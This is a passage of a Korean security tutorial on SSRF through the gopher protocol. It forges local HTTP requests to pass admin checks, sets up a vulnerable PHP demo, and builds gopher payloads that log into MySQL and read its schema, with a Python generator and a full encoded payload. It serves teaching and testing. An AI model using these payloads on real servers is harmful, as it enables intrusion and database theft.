id=\"gopher-protocol을-활용한-http-패킷-전송\" style=\"position:relative;\"><a href=\"#gopher-protocol%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-http-%ED%8C%A8%ED%82%B7-%EC%A0%84%EC%86%A1\" aria-label=\"gopher protocol을 활용한 http 패킷 전송 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gopher Protocol을 활용한 HTTP 패킷 전송</h3>\n<ul>\n<li>HTTP 패킷을 그대로 만들어서 전송이 가능합니다.</li>\n<li>구조는 다음과 같은 형태로 구성하여 전송을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//&lt;proxy-server>/_GET%20http://&lt;attacker.kr:80>/EX%20HTTP/1.1%0d%0a</span>\ngopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//&lt;proxy-server>/_POST%20http://&lt;attacker.kr:80>/EX%20HTTP/1.1%0d%0aContent-Length:21%0d%0aCookie:%20c_s=1%0d%0adata={a:1}</span></code></pre></div>\n<p><strong>Gopher HTTP (POST)</strong></p>\n<ul>\n<li>정상적인 HTTP POST 요청 패킷</li>\n<li><code class=\"language-text\">\\r\\n</code> 을 URL Encoding 하면 %0d%0a 사용됩니다.</li>\n<li><code class=\"language-text\">Content-Length</code> 헤더가 존재해야 POST Body 데이터가 전송이 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>data <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span>application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span><span class=\"token constant\">POST_BODY</span> 길이\\r\\n\n\\r\\n\n<span class=\"token constant\">POST_BODY</span></code></pre></div>\n<ul>\n<li>Gopher 프로토콜을 활용하여 POST 패킷을 전송할 경우</li>\n<li>Gopher를 사용할 때 첫 한바이트는 건너 뛰고 사용해야 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1/ _POST%20/data%20HTTP/1.1%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:%209%0d%0a%0d%0aPOST_BODY</span></code></pre></div>\n<p><strong>Gopher HTTP (Header)</strong></p>\n<ul>\n<li>만약 다음 PHP 코드로 구성되어 있을 경우 다음과 같이 Gopher를 활용하여 통과할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_XXXX'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"True\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">GET</span> <span class=\"token operator\">/</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\\r\\n\n<span class=\"token constant\">XXXX</span><span class=\"token punctuation\">:</span><span class=\"token number\">1234</span>\\r\\n\\r\\n</code></pre></div>\n<ul>\n<li>위의 예시를 통해 다음 조건이 걸려 있다면 다음과 같이 구성을 하면됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span>\n<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_ADMIN'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span>\n<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span>\n<span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span></code></pre></div>\n<ul>\n<li>공격 요청 패킷 정렬</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:80/_POST /api/admin.php HTTP/1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>\\r\\n\n<span class=\"token constant\">ADMIN</span><span class=\"token punctuation\">:</span> admin\\r\\n\nCookie<span class=\"token punctuation\">:</span> admin<span class=\"token operator\">=</span>admin<span class=\"token punctuation\">;</span>\\r\\n\nConnection<span class=\"token punctuation\">:</span> close\\r\\n\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">11</span>\\r\\n\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>www<span class=\"token operator\">-</span>form<span class=\"token operator\">-</span>urlencoded\\r\\n\n\\r\\n\n\\r\\n\nadmin<span class=\"token operator\">=</span>admin</code></pre></div>\n<ul>\n<li>gopher 프로토콜 포맷 정렬</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:80/_POST%20/api/admin.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aADMIN:%20admin%0d%0aCookie:%20admin=admin;%0d%0aConnection:%20close%0d%0aContent-Length:%2011%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0a%0d%0aadmin=admin</span></code></pre></div>\n<h3 id=\"gopher-프로토콜-활용-데이터베이스-접근\" style=\"position:relative;\"><a href=\"#gopher-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C-%ED%99%9C%EC%9A%A9-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EC%A0%91%EA%B7%BC\" aria-label=\"gopher 프로토콜 활용 데이터베이스 접근 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gopher 프로토콜 활용 데이터베이스 접근</h3>\n<p><strong>취약한 대상 애플리케이션 소스 코드</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'db_perpus'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'source'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$source</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Do Not Url..'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$c_i</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_TIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_CONNECTTIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_FOLLOWLOCATION</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>gopher ssrf database<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>gopher ssrf database<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>get<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>url<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>?source<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>source<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$result</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>대상 애플리케이션에서 <code class=\"language-text\">mysqli_connect</code> 를 통해 <code class=\"language-text\">database host</code>, <code class=\"language-text\">database id</code>, <code class=\"language-text\">pw</code>, <code class=\"language-text\">database name</code> 으로 구성되어 있습니다.</li>\n<li>현재 설정된 데이터를 확인해보면 패스워드가 설정되지 않고 운영이 되고 있습니다.</li>\n<li>gopher를 활용하기에 앞서 해당 애플리케이션의 데이터베이스 버전 정보와 서버 환경의 데이터를 수집을 진행합니다.</li>\n<li>mysql 을 사용하기 때문에, 실제 같은 환경을 구축한 후 mysql를 사용하여 로그인을 진행하면서 패킷을 수집합니다. 이때 대상 환경이 패스워드가 설정되어 있지 않기 때문에 로그인을 하지 않은 상태에서 id,host 정보만으로 접근을 시도합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">mysql <span class=\"token operator\">-</span>h <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token operator\">-</span>u root</code></pre></div>\n<ul>\n<li>연결을 진행한 후 패킷을 수집시 raw 데이터를 파싱해서 저장합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACo0lEQVQoz1WSy08TURSHZ20U91KdTplCy1gfoEgpCFapIT5igJLwb2jYuDC60BjfG0xMUONKTdSoC7G0pbxKW6Xy8IG6ANoCCoqPpO1MsfKZmWICN/nyO+fm5svJvVewlduw2QtUVlbg2OHAbJEwSxKWkhJkq0yZrcxAlkswS2ZEUUQ0i5jNIhZJZJskIlkk5FIZwaO4OCDX4La6uH25k9CTF/gePKPnwTP6nvoY6u4j0hshGooaDPkHGfD109cdYnJsgksdZ9m50UqdqYK64goEj7SPRrGOI3I9T+71EI8uEOlPEBtM8Wr4C68i63kd/cpIbIFYeI6PnzQud1xHEbbg3KhQvcGO4LHvxV3i5qjdzf27fkIDC/gDCQLBpJFrCQQTBFbT55siOvKL8yev4BBM1Gx24CxSEE6UN3KstIHjtgbu3+lhYGiRYDBBb2/SyFAoRSj0v06u9in8/mli8d9cOHW1ICzajnOTgnDUXk+T3MBhs4tHXc8ZDU8T653kzfAMbyIJPozO8WlinsmxOT7ojM4WcizF/GyWG6evoQjFhQl14UGrfpku3FudPLz1mLD/Lf3dcYYC4wwPfCQW/sx4fIr3EzO8G5/h7eg0M5NJ5j8nUX9m6DxzjfK1wia5loOmajxiDcGXYZaykFpMM/c9y+y3LF9/qCylc+tQc3k0dRl9dV28iV3Yguu/0CPvw72tFo+ljvhgxDi0ktcP5wus5Fn5m4e/hVrPfP4PmqqtCjsNoT5htf4oTaU1NIr7OWRyMujrQ83lSKfTLC8vk8lkjDqXy6GqGllVRdNyaJpGNpM1hJ3nbqAIJlxFDuPrCFU7K9mjVFLl2IO3xUt7ezter5e2trZ1tLS00NzcTGtrq4He6/v1rv0oko3dZQ52WbfzDwqUSA5WfSoQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Gopher Wireshark\"\n        title=\"Gopher Wireshark\"\n        src=\"/static/9380958e37abacec33b7ce490b8e2342/37523/0.png\"\n        srcset=\"/static/9380958e37abacec33b7ce490b8e2342/e9ff0/0.png 180w,\n/static/9380958e37abacec33b7ce490b8e2342/f21e7/0.png 360w,\n/static/9380958e37abacec33b7ce490b8e2342/37523/0.png 720w,\n/static/9380958e37abacec33b7ce490b8e2342/302a4/0.png 1080w,\n/static/9380958e37abacec33b7ce490b8e2342/07a9c/0.png 1440w,\n/static/9380958e37abacec33b7ce490b8e2342/29114/0.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>gopher 패킷 구축</strong></p>\n<ul>\n<li>mysql 로 로그인한 해당 패킷 raw 데이터를 기반으로 gopher 패킷을 생성하여 쿼리를 수행할 수 있는 하나의 페이로드를 만들어보겠습니다.</li>\n</ul>\n<p><a href=\"https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py\">Automation/SSRF-through-Gopher.py at master · tarunkant/Automation</a></p>\n<ul>\n<li>위 script를 활용하여 raw 데이터를 gopher 패킷으로 formatting 할 수 있도록 도와주는 도구를 사용하였습니다.</li>\n<li>직접 구성을 해서 만드는 것도 추천합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">dump <span class=\"token operator\">=</span> <span class=\"token function\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Give connection packet of mysql: \"</span><span class=\"token punctuation\">)</span>\nquery <span class=\"token operator\">=</span> <span class=\"token function\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Give query to execute: \"</span><span class=\"token punctuation\">)</span>\n\nauth <span class=\"token operator\">=</span> dump<span class=\"token operator\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token class-name return-type\">a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"gopher://127.0.0.1:3306/_%\"</span> <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"%\"</span><span class=\"token operator\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">get_payload</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>query<span class=\"token operator\">.</span><span class=\"token function\">strip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \t<span class=\"token class-name return-type\">query</span> <span class=\"token operator\">=</span> query<span class=\"token operator\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hex\"</span><span class=\"token punctuation\">)</span>\n    \tquery_length <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'{:x}'</span><span class=\"token operator\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \tpay1 <span class=\"token operator\">=</span> query_length<span class=\"token operator\">.</span><span class=\"token function\">rjust</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"00000003\"</span> <span class=\"token operator\">+</span> query\n    \t<span class=\"token keyword\">final</span> <span class=\"token operator\">=</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>auth <span class=\"token operator\">+</span> pay1 <span class=\"token operator\">+</span> <span class=\"token string double-quoted-string\">\"0100000001\"</span><span class=\"token punctuation\">)</span>\n    \t<span class=\"token keyword\">return</span> <span class=\"token keyword\">final</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>auth<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"\\nYour gopher link is ready to do SSRF : \\n\"</span>\n<span class=\"token keyword\">print</span> <span class=\"token function\">get_payload</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>최종적인 요청 패킷을 만들어 전송시 로그인이 완료되고 쿼리를 수행할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">gopher<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:3306/_%25%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%40%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%74%61%62%6c%65%5f%6e%61%6d%65%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%3b%01%00%00%00%01%25%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%40%00%00%00%03%73%65%6c%65%63%74%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%74%61%62%6c%65%5f%6e%61%6d%65%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%3b%01%00%00%00%01'</span></code></pre></div>\n<ul>\n<li>다음과 같은 쿼리를 구성해서 gopher 패킷을 제작해 전송하여 서버측 데이터베이스 의 정보를 탈취할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">select @@version_comment limit <span class=\"token number\">1</span>@ select <span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema<span class=\"token operator\">.</span>tables<span class=\"token punctuation\">;</span>\n\n<span class=\"token constant\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token constant\">FROM</span> Information_schema<span class=\"token operator\">.</span>tables <span class=\"token constant\">WHERE</span> table_schema <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span> 